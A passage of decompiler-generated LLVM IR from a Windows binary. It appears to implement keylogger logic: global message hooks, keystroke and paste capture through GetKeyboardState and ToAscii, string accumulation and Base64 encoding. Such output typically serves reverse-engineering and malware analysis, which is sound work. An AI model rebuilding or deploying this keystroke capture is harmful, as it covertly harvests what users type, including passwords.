  %7 = call i32 @function_4075a4(), !insn.addr !740
  %8 = call i32 @"@LStrDelete"(), !insn.addr !741
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !742
  br label %dec_label_pc_40531b, !insn.addr !742

dec_label_pc_40528a:                              ; preds = %dec_label_pc_40525d
  %9 = call i32 @function_4075a4(), !insn.addr !743
  %10 = call i32 @"@LStrDelete"(), !insn.addr !744
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !745
  br label %dec_label_pc_40531b, !insn.addr !745

dec_label_pc_4052a7:                              ; preds = %dec_label_pc_40525d
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !746
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !747
  %14 = udiv i32 %1, 65536, !insn.addr !748
  %15 = and i32 %14, 255, !insn.addr !749
  %16 = inttoptr i32 %15 to i16*, !insn.addr !750
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !751
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !752
  %19 = icmp eq i32 %18, 1, !insn.addr !753
  %20 = icmp eq i1 %19, false, !insn.addr !754
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !754
  br i1 %20, label %dec_label_pc_40531b, label %dec_label_pc_4052d3, !insn.addr !754

dec_label_pc_4052d3:                              ; preds = %dec_label_pc_4052a7
  %21 = call i32 @function_40726c(), !insn.addr !755
  %22 = icmp eq i32 %21, 0, !insn.addr !756
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !757
  br i1 %22, label %dec_label_pc_40531b, label %dec_label_pc_4052df, !insn.addr !757

dec_label_pc_4052df:                              ; preds = %dec_label_pc_4052d3
  %23 = call i32 @function_4034c8(), !insn.addr !758
  %24 = icmp sgt i32 %23, 15, !insn.addr !759
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !759
  br i1 %24, label %dec_label_pc_40531b, label %dec_label_pc_4052f0, !insn.addr !759

dec_label_pc_4052f0:                              ; preds = %dec_label_pc_4052df
  %25 = call i32 @function_4075a4(), !insn.addr !760
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !761
  %27 = call i32 @"@LStrInsert"(), !insn.addr !762
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !762
  br label %dec_label_pc_40531b, !insn.addr !762

dec_label_pc_40531b:                              ; preds = %dec_label_pc_4052f0, %dec_label_pc_4052df, %dec_label_pc_4052d3, %dec_label_pc_4052a7, %dec_label_pc_40528a, %dec_label_pc_40526b, %dec_label_pc_405220
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !763
  %29 = load i32, i32* %28, align 4, !insn.addr !763
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !764
  %30 = add i32 %esp.0.reload, 8, !insn.addr !765
  %31 = inttoptr i32 %30 to i32*, !insn.addr !765
  store i32 4215611, i32* %31, align 4, !insn.addr !765
  %32 = call i32 @"@LStrClr"(), !insn.addr !766
  ret i32 %32, !insn.addr !767
}

define i32 @function_405334() local_unnamed_addr {
dec_label_pc_405334:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !768
  ret i32 %0, !insn.addr !768
}

define i32 @function_405339() local_unnamed_addr {
dec_label_pc_405339:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !769
}

define i32 @function_40533b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40533b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !770
}

define i32 @function_405344(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405344:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !771
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !771
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !771
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !772
  %2 = call i32 @function_407508(), !insn.addr !773
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !774
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !775
  %4 = add i32 %1, 8, !insn.addr !776
  %5 = inttoptr i32 %4 to i32*, !insn.addr !776
  store i32 4215818, i32* %5, align 4, !insn.addr !776
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !777
  ret i32 %6, !insn.addr !778
}

define i32 @function_405403() local_unnamed_addr {
dec_label_pc_405403:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !779
  ret i32 %0, !insn.addr !779
}

define i32 @function_405408() local_unnamed_addr {
dec_label_pc_405408:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !780
}

define i32 @function_40540a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40540a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !781
}

define i32 @function_405410(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405410:
  %esp.0.reg2mem = alloca i32, !insn.addr !782
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !783
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !783
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !783
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !784
  %3 = call i32 @function_407478(), !insn.addr !785
  %4 = icmp eq i32 %3, 0, !insn.addr !786
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !787
  br i1 %4, label %dec_label_pc_405474, label %dec_label_pc_405431, !insn.addr !787

dec_label_pc_405431:                              ; preds = %dec_label_pc_405410
  %5 = inttoptr i32 %0 to i8*, !insn.addr !788
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405498 to i32*), i8* null, i8* %5), !insn.addr !789
  %7 = ptrtoint i32* %6 to i32, !insn.addr !789
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !790
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !790
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !791
  %10 = icmp eq i1 %9, false, !insn.addr !792
  br i1 %10, label %dec_label_pc_40546f, label %dec_label_pc_40544c, !insn.addr !793

dec_label_pc_40544c:                              ; preds = %dec_label_pc_405431
  %11 = call i32 @function_4072d8(), !insn.addr !794
  %12 = call i32 @"@LStrAsg"(), !insn.addr !795
  %13 = call i32 @function_407600(), !insn.addr !796
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !797
  br label %dec_label_pc_405474, !insn.addr !797

dec_label_pc_40546f:                              ; preds = %dec_label_pc_405431
  %14 = call i32 @function_407734(), !insn.addr !798
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !798
  br label %dec_label_pc_405474, !insn.addr !798

dec_label_pc_405474:                              ; preds = %dec_label_pc_40546f, %dec_label_pc_40544c, %dec_label_pc_405410
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !799
  %16 = load i32, i32* %15, align 4, !insn.addr !799
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !800
  %17 = add i32 %esp.0.reload, 8, !insn.addr !801
  %18 = inttoptr i32 %17 to i32*, !insn.addr !801
  store i32 4215953, i32* %18, align 4, !insn.addr !801
  %19 = call i32 @"@LStrClr"(), !insn.addr !802
  ret i32 %19, !insn.addr !803
}

define i32 @function_40548a() local_unnamed_addr {
dec_label_pc_40548a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !804
  ret i32 %0, !insn.addr !804
}

define i32 @function_40548f() local_unnamed_addr {
dec_label_pc_40548f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !805
}

define i32 @function_405491(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405491:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !806
}

define i32 @function_405495() local_unnamed_addr {
dec_label_pc_405495:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !807
  %8 = inttoptr i32 %4 to i8*, !insn.addr !807
  store i8 %7, i8* %8, align 1, !insn.addr !807
  %9 = add i32 %2, 111, !insn.addr !808
  %10 = inttoptr i32 %9 to i8*, !insn.addr !808
  %11 = load i8, i8* %10, align 1, !insn.addr !808
  %12 = load i32, i32* %eax, align 4, !insn.addr !808
  %13 = trunc i32 %12 to i8, !insn.addr !808
  %14 = add i8 %11, %13, !insn.addr !808
  store i8 %14, i8* %10, align 1, !insn.addr !808
  %15 = trunc i32 %3 to i16, !insn.addr !809
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !809
  %17 = inttoptr i32 %0 to i32*, !insn.addr !809
  store i32 %16, i32* %17, align 4, !insn.addr !809
  %18 = add i32 %0, 66, !insn.addr !810
  %19 = inttoptr i32 %18 to i64*, !insn.addr !810
  %20 = load i64, i64* %19, align 4, !insn.addr !810
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !810
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !811
  %22 = load i8, i8* %5, align 4, !insn.addr !812
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !812
  %25 = add i8 %22, %24, !insn.addr !812
  %26 = inttoptr i32 %23 to i8*, !insn.addr !812
  store i8 %25, i8* %26, align 1, !insn.addr !812
  %27 = add i32 %21, -117, !insn.addr !813
  %28 = inttoptr i32 %27 to i8*, !insn.addr !813
  %29 = load i8, i8* %28, align 1, !insn.addr !813
  %30 = trunc i32 %3 to i8, !insn.addr !813
  %31 = add i8 %29, %30, !insn.addr !813
  store i8 %31, i8* %28, align 1, !insn.addr !813
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !814
  %33 = add i32 %21, 16, !insn.addr !815
  %34 = inttoptr i32 %33 to i32*, !insn.addr !815
  %35 = load i32, i32* %34, align 4, !insn.addr !815
  %36 = add i32 %21, 12, !insn.addr !816
  %37 = inttoptr i32 %36 to i32*, !insn.addr !816
  %38 = load i32, i32* %37, align 4, !insn.addr !816
  %39 = add i32 %21, 8, !insn.addr !817
  %40 = inttoptr i32 %39 to i32*, !insn.addr !817
  %41 = load i32, i32* %40, align 4, !insn.addr !817
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !818
  %43 = inttoptr i32 %42 to i32*, !insn.addr !819
  %44 = load i32, i32* %43, align 4, !insn.addr !819
  %45 = icmp eq i32 %44, 0, !insn.addr !819
  %46 = icmp eq i1 %45, false, !insn.addr !820
  %47 = icmp eq i32 %41, 0, !insn.addr !821
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !822
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_4054cb, label %dec_label_pc_4054fa, !insn.addr !823

dec_label_pc_4054cb:                              ; preds = %dec_label_pc_405495
  store i32 %35, i32* %eax, align 4, !insn.addr !824
  %51 = add i32 %35, 4, !insn.addr !825
  %52 = inttoptr i32 %51 to i32*, !insn.addr !825
  %53 = load i32, i32* %52, align 4, !insn.addr !825
  switch i32 %53, label %dec_label_pc_4054fa [
    i32 256, label %dec_label_pc_4054e2
    i32 770, label %dec_label_pc_4054f3
  ]

dec_label_pc_4054e2:                              ; preds = %dec_label_pc_4054cb
  %54 = call i32 @function_405220(i32 %2, i32 %1, i32 %0), !insn.addr !826
  br label %dec_label_pc_4054fa, !insn.addr !827

dec_label_pc_4054f3:                              ; preds = %dec_label_pc_4054cb
  %55 = call i32 @function_405344(i32 %2, i32 %1, i32 %0), !insn.addr !828
  br label %dec_label_pc_4054fa, !insn.addr !828

dec_label_pc_4054fa:                              ; preds = %dec_label_pc_405495, %dec_label_pc_4054cb, %dec_label_pc_4054f3, %dec_label_pc_4054e2
  %56 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !829
  %57 = inttoptr i32 %35 to i32*, !insn.addr !830
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !830
  ret i32 %58, !insn.addr !831
}

define i32 @function_405510(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405510:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !832
  %5 = icmp eq i1 %4, false, !insn.addr !833
  %6 = icmp eq i32 %arg3, 0, !insn.addr !834
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_40552e, label %dec_label_pc_405540, !insn.addr !835

dec_label_pc_40552e:                              ; preds = %dec_label_pc_405510
  %8 = add i32 %arg1, 8, !insn.addr !836
  %9 = inttoptr i32 %8 to i32*, !insn.addr !836
  %10 = load i32, i32* %9, align 4, !insn.addr !836
  %11 = icmp eq i32 %10, 2, !insn.addr !837
  %12 = icmp eq i1 %11, false, !insn.addr !838
  br i1 %12, label %dec_label_pc_405540, label %dec_label_pc_405538, !insn.addr !838

dec_label_pc_405538:                              ; preds = %dec_label_pc_40552e
  %13 = call i32 @function_405410(i32 %1, i32 %2, i32 %0), !insn.addr !839
  br label %dec_label_pc_405540, !insn.addr !839

dec_label_pc_405540:                              ; preds = %dec_label_pc_405510, %dec_label_pc_405538, %dec_label_pc_40552e
  %14 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !840
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !841
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !841
  ret i32 %16, !insn.addr !842
}

define i32 @function_405558() local_unnamed_addr {
dec_label_pc_405558:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215972 to i32*), i32 3), !insn.addr !843
  %2 = ptrtoint i32* %1 to i32, !insn.addr !843
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !844
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4216080 to i32*), i32 4), !insn.addr !845
  %5 = ptrtoint i32* %4 to i32, !insn.addr !845
  store i32 %5, i32* @global_var_4096b8, align 4, !insn.addr !846
  ret i32 %5, !insn.addr !847
}

define i32 @function_405590() local_unnamed_addr {
dec_label_pc_405590:
  %0 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !848
  %1 = inttoptr i32 %0 to i32*, !insn.addr !849
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !849
  %3 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !850
  %4 = inttoptr i32 %3 to i32*, !insn.addr !851
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !851
  %6 = sext i1 %5 to i32, !insn.addr !851
  ret i32 %6, !insn.addr !852
}

define i32 @function_4055a8() local_unnamed_addr {
dec_label_pc_4055a8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !853
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !853
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !853
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !854
  %2 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !855
  %3 = add i32 %2, 1, !insn.addr !855
  store i32 %3, i32* @global_var_4096b0, align 4, !insn.addr !855
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !856
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !857
  ret i32 0, !insn.addr !858
}

define i32 @function_4055cd() local_unnamed_addr {
dec_label_pc_4055cd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !859
  ret i32 %0, !insn.addr !859
}

define i32 @function_4055d2() local_unnamed_addr {
dec_label_pc_4055d2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !860
}

define i32 @function_4055d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4055d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !861
}

define i32 @function_4055d8() local_unnamed_addr {
dec_label_pc_4055d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !862
  %2 = add i32 %1, -1, !insn.addr !862
  store i32 %2, i32* @global_var_4096b0, align 4, !insn.addr !862
  ret i32 %0, !insn.addr !863
}

define i32 @function_4055e3(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4055e3:
  %storemerge.reg2mem = alloca i32, !insn.addr !864
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !864
  %5 = inttoptr i32 %3 to i32*, !insn.addr !864
  store i32 %4, i32* %5, align 4, !insn.addr !864
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !865
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !865
  %10 = add i8 %7, %9, !insn.addr !865
  %11 = inttoptr i32 %8 to i8*, !insn.addr !865
  store i8 %10, i8* %11, align 1, !insn.addr !865
  %12 = load i32, i32* %eax, align 4, !insn.addr !866
  store i32 %arg1, i32* %eax, align 4, !insn.addr !867
  %13 = add i32 %12, 99, !insn.addr !868
  %14 = inttoptr i32 %13 to i64*, !insn.addr !868
  %15 = load i64, i64* %14, align 4, !insn.addr !868
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !868
  %17 = add i32 %16, -2, !insn.addr !869
  %18 = inttoptr i32 %17 to i16*, !insn.addr !869
  store i16 27241, i16* %18, align 2, !insn.addr !869
  %19 = mul i32 %2, 2, !insn.addr !870
  %20 = add i32 %2, 110, !insn.addr !870
  %21 = add i32 %20, %19, !insn.addr !870
  %22 = inttoptr i32 %21 to i32*, !insn.addr !870
  %23 = load i32, i32* %22, align 4, !insn.addr !870
  %24 = sext i32 %23 to i64, !insn.addr !870
  %25 = mul nsw i64 %24, 111, !insn.addr !870
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !870
  %28 = icmp eq i64 %25, %27, !insn.addr !870
  br i1 %28, label %dec_label_pc_405615, label %dec_label_pc_405684, !insn.addr !871

dec_label_pc_405615:                              ; preds = %dec_label_pc_4055e3
  %29 = icmp eq i32 %0, 0, !insn.addr !872
  br i1 %29, label %dec_label_pc_40568c, label %dec_label_pc_405619, !insn.addr !873

dec_label_pc_405619:                              ; preds = %dec_label_pc_405615
  %30 = icmp slt i32 %0, 0, !insn.addr !872
  br i1 %30, label %dec_label_pc_405694, label %dec_label_pc_40561b, !insn.addr !874

dec_label_pc_40561b:                              ; preds = %dec_label_pc_405619
  %31 = trunc i32 %0 to i8, !insn.addr !872
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !619, !insn.addr !872
  %33 = and i8 %32, 1, !insn.addr !872
  %34 = icmp eq i8 %33, 0, !insn.addr !872
  br i1 %34, label %dec_label_pc_40564d, label %dec_label_pc_40561d, !insn.addr !875

dec_label_pc_40561d:                              ; preds = %dec_label_pc_40561b
  %35 = add i32 %12, -1, !insn.addr !866
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !876
  %37 = load i32, i32* %36, align 4, !insn.addr !876
  %38 = xor i32 %37, %1, !insn.addr !876
  store i32 %38, i32* %36, align 4, !insn.addr !876
  %39 = add i32 %1, 959985462, !insn.addr !877
  %40 = inttoptr i32 %39 to i32*, !insn.addr !877
  %41 = load i32, i32* %40, align 4, !insn.addr !877
  %42 = xor i32 %41, %1, !insn.addr !877
  %43 = add i32 %16, -38, !insn.addr !878
  %44 = inttoptr i32 %43 to i32*, !insn.addr !878
  store i32 %35, i32* %44, align 4, !insn.addr !878
  %45 = add i32 %16, -42, !insn.addr !879
  %46 = inttoptr i32 %45 to i32*, !insn.addr !879
  store i32 %42, i32* %46, align 4, !insn.addr !879
  %47 = add i32 %16, -22, !insn.addr !880
  %48 = inttoptr i32 %47 to i32*, !insn.addr !880
  store i32 0, i32* %48, align 4, !insn.addr !880
  %49 = add i32 %16, -26, !insn.addr !881
  %50 = inttoptr i32 %49 to i32*, !insn.addr !881
  store i32 0, i32* %50, align 4, !insn.addr !881
  %51 = add i32 %16, -30, !insn.addr !882
  %52 = inttoptr i32 %51 to i32*, !insn.addr !882
  store i32 0, i32* %52, align 4, !insn.addr !882
  %53 = add i32 %16, -34, !insn.addr !883
  %54 = inttoptr i32 %53 to i32*, !insn.addr !883
  store i32 0, i32* %54, align 4, !insn.addr !883
  %55 = add i32 %16, -6, !insn.addr !884
  %56 = inttoptr i32 %55 to i32*, !insn.addr !884
  store i32 %arg3, i32* %56, align 4, !insn.addr !884
  %57 = add i32 %16, -46, !insn.addr !885
  %58 = inttoptr i32 %57 to i32*, !insn.addr !885
  store i32 %17, i32* %58, align 4, !insn.addr !885
  ret i32 0, !insn.addr !885

dec_label_pc_40564d:                              ; preds = %dec_label_pc_40561b
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !886
  %60 = trunc i64 %25 to i32, !insn.addr !870
  %61 = load i32, i32* %eax, align 4, !insn.addr !887
  %62 = add i32 %61, 1, !insn.addr !887
  %63 = mul i32 %59, 8, !insn.addr !888
  %64 = add i32 %59, 48, !insn.addr !888
  %65 = add i32 %64, %63, !insn.addr !888
  %66 = inttoptr i32 %65 to i8*, !insn.addr !888
  %67 = load i8, i8* %66, align 4, !insn.addr !888
  %68 = udiv i32 %62, 256, !insn.addr !888
  %69 = trunc i32 %68 to i8, !insn.addr !888
  %70 = add i8 %67, %69, !insn.addr !888
  store i8 %70, i8* %66, align 4, !insn.addr !888
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !889
  %71 = call i32 @"@LStrClr"(), !insn.addr !890
  %72 = call i32 @function_4034c8(), !insn.addr !891
  %73 = add i32 %60, -8, !insn.addr !892
  %74 = inttoptr i32 %73 to i32*, !insn.addr !892
  store i32 %72, i32* %74, align 4, !insn.addr !892
  %75 = ashr i32 %72, 31, !insn.addr !893
  %76 = zext i32 %72 to i64, !insn.addr !894
  %77 = zext i32 %75 to i64, !insn.addr !894
  %78 = mul i64 %77, 4294967296, !insn.addr !894
  %79 = or i64 %78, %76, !insn.addr !894
  %80 = sdiv i64 %79, 3, !insn.addr !894
  %81 = trunc i64 %80 to i32, !insn.addr !894
  store i32 %81, i32* %eax, align 4, !insn.addr !894
  %82 = srem i64 %79, 3, !insn.addr !894
  %83 = trunc i64 %82 to i32, !insn.addr !894
  %84 = icmp eq i32 %83, 0, !insn.addr !895
  %85 = icmp eq i1 %84, false, !insn.addr !896
  br i1 %85, label %dec_label_pc_405683, label %dec_label_pc_405676, !insn.addr !896

dec_label_pc_405676:                              ; preds = %dec_label_pc_40564d
  %86 = load i32, i32* %74, align 4, !insn.addr !897
  %87 = ashr i32 %86, 31, !insn.addr !898
  %88 = zext i32 %86 to i64, !insn.addr !899
  %89 = zext i32 %87 to i64, !insn.addr !899
  %90 = mul i64 %89, 4294967296, !insn.addr !899
  %91 = or i64 %90, %88, !insn.addr !899
  %92 = sdiv i64 %91, 3, !insn.addr !899
  %93 = trunc i64 %92 to i32, !insn.addr !899
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !900
  br label %dec_label_pc_405690, !insn.addr !900

dec_label_pc_405683:                              ; preds = %dec_label_pc_40564d
  ret i32 %81, !insn.addr !900

dec_label_pc_405684:                              ; preds = %dec_label_pc_4055e3
  %94 = load i32, i32* %eax, align 4, !insn.addr !901
  ret i32 %94, !insn.addr !901

dec_label_pc_40568c:                              ; preds = %dec_label_pc_405615
  %95 = load i32, i32* %eax, align 4, !insn.addr !902
  %96 = zext i32 %95 to i64, !insn.addr !902
  %97 = zext i32 %arg3 to i64, !insn.addr !902
  %98 = mul i64 %97, 4294967296, !insn.addr !902
  %99 = or i64 %98, %96, !insn.addr !902
  %100 = zext i32 %arg2 to i64, !insn.addr !902
  %101 = sdiv i64 %99, %100, !insn.addr !902
  %102 = trunc i64 %101 to i32, !insn.addr !902
  %103 = add i32 %102, 1, !insn.addr !903
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !903
  br label %dec_label_pc_405690, !insn.addr !903

dec_label_pc_405690:                              ; preds = %dec_label_pc_405676, %dec_label_pc_40568c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !904
  ret i32 %104, !insn.addr !905

dec_label_pc_405694:                              ; preds = %dec_label_pc_405619
  %105 = inttoptr i32 %1 to i32*, !insn.addr !906
  %106 = load i32, i32* %105, align 4, !insn.addr !906
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !906
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !907
  %109 = load i32, i32* %108, align 4, !insn.addr !907
  %110 = add i32 %109, %107, !insn.addr !907
  store i32 %110, i32* %108, align 4, !insn.addr !907
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !908
  %113 = inttoptr i32 %112 to i8*, !insn.addr !908
  %114 = load i8, i8* %113, align 1, !insn.addr !908
  %115 = trunc i32 %111 to i8, !insn.addr !908
  %116 = add i8 %114, %115, !insn.addr !908
  store i8 %116, i8* %113, align 1, !insn.addr !908
  %117 = load i32, i32* %eax, align 4, !insn.addr !909
  ret i32 %117, !insn.addr !909
}

define i32 @function_40569c() local_unnamed_addr {
dec_label_pc_40569c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !910
  %esp.0.reg2mem = alloca i32, !insn.addr !910
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !911
  %3 = inttoptr i32 %2 to i32*, !insn.addr !911
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !912
  %13 = inttoptr i32 %12 to i32*, !insn.addr !912
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !910
  br label %dec_label_pc_40569e, !insn.addr !910

dec_label_pc_40569e:                              ; preds = %dec_label_pc_4057e9, %dec_label_pc_40569c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !913
  %25 = add i32 %24, 3, !insn.addr !914
  %26 = load i32, i32* %3, align 4, !insn.addr !911
  %27 = icmp sgt i32 %25, %26, !insn.addr !915
  br i1 %27, label %dec_label_pc_40573e, label %dec_label_pc_4056af, !insn.addr !915

dec_label_pc_4056af:                              ; preds = %dec_label_pc_40569e
  %28 = add i32 %24, %0, !insn.addr !916
  %29 = inttoptr i32 %28 to i8*, !insn.addr !916
  %30 = load i8, i8* %29, align 1, !insn.addr !916
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !917
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_4055e8 to i32), !insn.addr !918
  %34 = inttoptr i32 %33 to i8*, !insn.addr !918
  %35 = load i8, i8* %34, align 1, !insn.addr !918
  store i8 %35, i8* %5, align 1, !insn.addr !919
  %36 = load i8, i8* %29, align 1, !insn.addr !920
  %37 = mul i8 %36, 16, !insn.addr !921
  %38 = and i8 %37, 48, !insn.addr !922
  %39 = add i32 %28, 1, !insn.addr !923
  %40 = inttoptr i32 %39 to i8*, !insn.addr !923
  %41 = load i8, i8* %40, align 1, !insn.addr !923
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !924
  %44 = zext i8 %43 to i32, !insn.addr !924
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_4055e8 to i32), !insn.addr !925
  %46 = inttoptr i32 %45 to i8*, !insn.addr !925
  %47 = load i8, i8* %46, align 1, !insn.addr !925
  store i8 %47, i8* %7, align 1, !insn.addr !926
